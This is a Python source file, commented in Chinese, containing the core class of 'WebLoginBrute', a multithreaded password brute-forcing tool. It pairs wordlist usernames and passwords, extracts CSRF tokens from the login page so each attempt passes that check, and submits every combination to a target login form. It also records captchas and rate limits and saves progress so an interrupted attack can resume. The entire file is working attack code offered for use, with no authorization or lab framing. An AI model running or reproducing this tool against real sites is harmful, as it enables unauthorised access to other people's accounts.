#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import os
import signal
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, RLock
from typing import List

from .config import Config
from .exceptions import RateLimitError
from .http_client import HttpClient
from .logger import setup_logging
from .parsers import analyze_form_fields, contains_captcha, extract_token
from .reporting import StatsManager
from .state import StateManager
from .wordlists import load_wordlist


class WebLoginBrute:
    """
    核心流程调度类，负责整体爆破流程的编排与异常处理。
    """

    def __init__(self, config: Config):
        self.config = config
        setup_logging(config.verbose)
        self.http = HttpClient(config)
        self.state = StateManager(config)
        self.stats = StatsManager()
        self.success = Event()
        self.executor = None

    def run(self):
        logging.info("开始WebLoginBrute主流程...")
        # 1. 预解析目标域名
        self.http.pre_resolve_targets([self.config.form_url, self.config.submit_url])
        # 2. 加载字典
        usernames = list(load_wordlist(self.config.username_file, self.config))
        passwords = list(load_wordlist(self.config.password_file, self.config))
        logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
        # 3. 恢复进度
        loaded_attempts, stats_from_file = self.state.load_progress()
        if stats_from_file:
            self.stats.update_from_progress(stats_from_file)
        # 4. 设置线程池
        self.executor = ThreadPoolExecutor(
            max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
        )
        # 5. 记录开始时间
        self.stats.stats["start_time"] = time.time()
        try:
            self._brute_force(usernames, passwords)
        except KeyboardInterrupt:
            logging.info("用户中断操作，保存进度...")
            self.state.save_progress(self.stats.get_stats())
        except Exception as e:
            logging.error(f"运行过程中发生错误: {e}")
            self.state.save_progress(self.stats.get_stats())
        finally:
            self.stats.stats["end_time"] = time.time()
            self.stats.finalize()
            self.stats.print_final_report()
            if self.success.is_set():
                self.state.cleanup_progress_file()
            self.http.close_all_sessions()

    def _brute_force(self, usernames: List[str], passwords: List[str]):
        total_combinations = len(usernames) * len(passwords)
        logging.info(f"开始暴力破解，总共 {total_combinations} 个组合")
        # 过滤已尝试的组合
        combinations = [
            (u, p)
            for u in usernames
            for p in passwords
            if not self.state.has_been_attempted((u, p))
        ]
        logging.info(f"过滤后剩余 {len(combinations)} 个组合")
        # 提交任务到线程池
        if not self.executor:
            raise RuntimeError("线程池未初始化")
        futures = []
        for username, password in combinations:
            if self.success.is_set():
                break
            future = self.executor.submit(self._try_login, username, password)
            futures.append(future)
            if len(futures) >= self.config.threads:
                self._wait_for_futures(futures)
                futures = []
        if futures:
            self._wait_for_futures(futures)

    def _wait_for_futures(self, futures):
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    self.success.set()
                    break
            except Exception as e:
                logging.error(f"任务执行失败: {e}")

    def _try_login(self, username: str, password: str) -> bool:
        if self.success.is_set():
            return False
        # 检查频率限制、对抗级别等可在此扩展
        try:
            # 1. 获取登录页面，提取token
            resp = self.http.get(self.config.form_url)
            if not resp or not resp.text:
                self.stats.update("other_errors")
                return False
            analyze_form_fields(resp.text)
            token = None
            if self.config.csrf:
                token = extract_token(
                    resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
                )
                if not token:
                    logging.warning(f"未能为 {username}:{password} 提取Token")
            # 2. 构造登录数据
            data = {"username": username, "password": password}
            if self.config.csrf and token:
                data[self.config.csrf] = token
            if self.config.login_field and self.config.login_value:
                data[self.config.login_field] = self.config.login_value
            # 3. 发送登录请求
            resp2 = self.http.post(self.config.submit_url, data=data)
            # 4. 检查登录结果
            if self._check_login_success(resp2):
                logging.info(f"登录成功: {username}:{password}")
                self.stats.update("successful_attempts")
                return True
            # 5. 检查验证码
            if contains_captcha(resp2.text):
                self.stats.update("captcha_detected")
                logging.warning(f"检测到验证码: {username}:{password}")
            # 6. 记录失败
            self.stats.update("total_attempts")
            self.state.add_attempted((username, password))
            if self.stats.stats["total_attempts"] % 100 == 0:
                self.state.save_progress(self.stats.get_stats())
            return False
        except RateLimitError as e:
            logging.error(f"频率限制错误: {e}")
            self.stats.update("rate_limit_errors")
            return False
        except Exception as e:
            logging.error(f"未知错误: {e}")
            self.stats.update("other_errors")
            return False

    def _check_login_success(self, response) -> bool:
        if not response or not response.text:
            return False
        # 简单的成功判断逻辑，可根据实际目标调整
        text = response.text.lower()
        success_keywords = ["welcome", "dashboard", "logout", "profile", "success"]
        failure_keywords = ["invalid", "incorrect", "failed", "error", "login"]
        success_count = sum(1 for k in success_keywords if k in text)
        failure_count = sum(1 for k in failure_keywords if k in text)
        return success_count > failure_count
